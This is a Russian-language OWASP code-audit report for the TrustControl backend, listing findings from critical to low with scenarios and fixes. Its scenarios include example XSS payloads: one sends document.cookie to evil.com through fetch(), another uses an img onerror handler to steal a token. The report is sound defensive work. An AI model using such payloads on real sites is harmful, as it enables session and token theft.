# SECURITY_AUDIT.md — TrustControl OWASP Audit

_Дата: 01.07.2026. Аудит кода (SAST), без пен-теста продакшн-сервера._
_Только находки, без фиксов. Фиксы — отдельной задачей после согласования._

---

## Итог по уровням

| Уровень  | Кол-во |
|----------|--------|
| КРИТИЧНЫЙ | 2     |
| HIGH      | 3     |
| MEDIUM    | 4     |
| LOW       | 4     |

---

## КРИТИЧНЫЕ

### CRIT-1: XSS-инъекция в HTML-шаблоне email

**Файл:** `backend/services/notifier.py`, функция `send_fraud_email()`  
**Класс OWASP:** A03:2021 Injection  

`location_name`, `description` и другие поля вставляются в HTML-тело письма через f-string без `html.escape()`. Если в названии точки или описании инцидента есть `<script>` или `<img onerror=...>`, HTML-клиенты (Outlook, Gmail-web) исполнят его у получателя.

**Сценарий:** владелец называет точку `"><script>fetch('evil.com?t='+document.cookie)</script>` → email с тревогой о фроде придёт с XSS-нагрузкой в заголовке.

**Приоритет:** закрыть перед включением SMTP. Фикс: `html.escape(location_name)` и т.д. для всех переменных в HTML-теле.

---

### CRIT-2: Трейсбек Python уходит в Telegram-чат владельца

**Файл:** `backend/api/reports.py`, строки ~850-872  
**Класс OWASP:** A09:2021 Security Logging and Monitoring Failures  

При необработанном исключении в фоновой задаче `_err_text = _tb.format_exc()[-800:]` отправляется прямо в Telegram-чат владельца. Трейсбек содержит пути к файлам, имена переменных, иногда части SQL-запросов и значения аргументов.

**Сценарий:** если через некорректный ввод вызвать ошибку БД — трейсбек с фрагментом SQL-запроса уйдёт клиенту. Внутренняя структура кода раскрыта.

**Фикс:** слать только краткое «ошибка обработки, уже смотрим», детали — только в `log.exception()`.

---

## HIGH

### HIGH-1: Отсутствие Content-Security-Policy

**Файл:** `nginx.prod.conf`, `main.py` (CORS middleware)  
**Класс OWASP:** A05:2021 Security Misconfiguration  

Nginx добавляет `X-Frame-Options`, `X-Content-Type-Options`, HSTS — но `Content-Security-Policy` нет ни в nginx, ни в FastAPI-ответах. Без CSP браузер исполняет любые inline-скрипты и внешние ресурсы.

**Сценарий:** если через MEDIUM-1 или MEDIUM-3 удастся вставить `<script>` в данные, которые рендерятся дашбордом без экранирования — браузер исполнит его без ограничений.

**Фикс:** добавить в nginx `add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-...'"`.

---

### HIGH-2: Verbose исключения в HTTP-ответах

**Файл:** `backend/api/download.py` и другие endpoint-ы  
**Класс OWASP:** A09:2021  

Ряд эндпоинтов возвращает текст Python-исключения напрямую:

```python
raise HTTPException(status_code=500, detail=f"Ошибка сборки архива: {exc}")
```

`exc` может содержать пути файловой системы, имена зависимостей, фрагменты SQL.

**Сценарий:** запрос на `/download` с некорректными параметрами → HTTP 500 с именем файла и стеком в теле ответа.

**Фикс:** возвращать generic "внутренняя ошибка", `exc` — только в `log.exception()`.

---

### HIGH-3: Долгий таймаут на скачивание EXE-файла (потенциальный DoS)

**Файл:** `backend/api/download.py`, строка ~65  
**Класс OWASP:** A05:2021  

```python
async with httpx.AsyncClient(follow_redirects=True, timeout=300) as c:
```

Таймаут 5 минут. Один запрос на `/download/installer` держит asyncio-корутину 300 секунд если источник медленный. При параллельных запросах event loop не блокируется (async), но `_PROCESS_SEMAPHORE` и пул коннектов к БД могут истощиться.

**Фикс:** `timeout=30` для head-запроса, стриминг с `asyncio.wait_for` и heartbeat для клиента.

---

## MEDIUM

### MED-1: XSS через пользовательские фразы в дашборде (Stored XSS)

**Файл:** `backend/api/locations.py` (сохранение `custom_phrases`, `menu_json`)  
**Класс OWASP:** A03:2021  

`custom_phrases` сохраняются через `.strip()[:60]` без HTML-экранирования. Если frontend рендерит их как innerHTML без escape — возможна stored XSS.

**Сценарий:** пользователь добавляет фразу `<img src=x onerror="stealToken()">` → дашборд владельца исполняет скрипт при открытии настроек точки.

**Фикс:** верификация на стороне frontend (`textContent` вместо `innerHTML`) и `html.escape()` при рендере.

---

### MED-2: Слабые требования к паролю

**Файл:** `backend/api/auth.py`, около строки 523  
**Класс OWASP:** A07:2021 Identification and Authentication Failures  

Единственная проверка: `len(password) >= 8`. Нет требований к сложности. Пользователь может поставить `11111111`.

**Сценарий:** брутфорс offline по утечке bcrypt-хешей (например, из бэкапа БД). Пароль «12345678» взламывается за минуты при GPU-атаке на bcrypt с cost=12.

**Фикс:** минимум одна цифра + одна заглавная ИЛИ zxcvbn score >= 2.

---

### MED-3: Отсутствие `Permissions-Policy` и `Referrer-Policy` во всех ответах

**Файл:** `nginx.prod.conf`  
**Класс OWASP:** A05:2021  

`Referrer-Policy` есть только в nginx на 443-сервере. FastAPI-ответы (включая JSON API) не добавляют security headers. `Permissions-Policy` (контроль камеры/геолокации/микрофона) отсутствует.

**Сценарий:** PWA-страница `/mic` запрашивает микрофон. Если вредоносный iframe встроил её в другой сайт — браузер разрешит доступ к микрофону без предупреждения (нет `Permissions-Policy: microphone=(self)`).

---

### MED-4: Отсутствие ротации логов Docker (операционная безопасность)

**Файл:** `docker-compose.prod.yml`  
**Класс OWASP:** A09:2021  

Нет параметра `logging.options.max-size`. Логи накапливаются бесконечно в `/var/lib/docker/containers/*/`.

**Сценарий:** через 2-4 месяца интенсивной работы диск /dev/vda1 переполняется → все контейнеры падают с `no space left on device` → полный даун сервиса.

---

## LOW

### LOW-1: API-ключ кассы хранится в plaintext в config.ini инсталлятора

**Файл:** `backend/api/download.py`, функция `_config_ini()`  
**Класс OWASP:** A02:2021 Cryptographic Failures  

Скачиваемый ZIP содержит `config.ini` с `API_KEY=<ключ>` открытым текстом. Если ZIP окажется в облачном бэкапе или email-вложении — ключ скомпрометирован.

**Рекомендация:** задокументировать риск для клиентов; предусмотреть ротацию API-ключа через ЛК (`PATCH /locations/{id}/rotate-key`).

---

### LOW-2: Admin-действия не пишутся в audit log

**Файл:** `backend/api/auth.py`, `/admin/extend-subscription`, `/admin/create-client`  
**Класс OWASP:** A09:2021  

Действия пишутся в application log, но не в таблицу БД. Ретроспективно невозможно восстановить кто и когда продлил подписку или создал клиента.

**Рекомендация:** добавить таблицу `audit_log` или хотя бы структурированное `log.info` с `user_id`, `action`, `target_id`, `ip`.

---

### LOW-3: Rate limit хранится в памяти (сбрасывается при редеплое)

**Файл:** `backend/api/auth.py`, `_rate_limit_attempts`; `backend/api/reports.py`, `_submit_attempts`  
**Класс OWASP:** A07:2021  

In-memory rate limit сбрасывается при перезапуске контейнера. При `--build` или `docker restart` атакующий получает чистый счётчик.

**Рекомендация:** для auth (логин) перенести rate limit в Redis или Postgres, либо добавить CAPTCHA после N неудачных попыток.

---

### LOW-4: Telegram chat_id не валидируется по формату

**Файл:** `backend/api/locations.py`, поле `telegram_chat`  
**Класс OWASP:** A03:2021  

Принимает любую строку до 50 символов. Отправка Telegram-сообщений на несуществующий или чужой chat_id генерирует лишние API-ошибки.

**Рекомендация:** валидировать regex `^-?\d{5,15}$` или `^@[\w]{5,32}$` на уровне Pydantic.

---

## Что НЕ является уязвимостью (clarification)

- **CSRF**: JWT хранится в `localStorage` и передаётся через `Authorization` header — браузер не отправляет его автоматически при cross-origin запросах. CSRF не применим для этой схемы.
- **SQL injection**: все запросы через SQLAlchemy ORM с параметризацией — риска нет.
- **API key + submit endpoint**: ключ привязан к конкретной `location_id`, разные точки изолированы.
- **Semaphore блокировка**: `MAX_CONCURRENT_PROCESSING=5` (дефолт), не 1, не блокирует.
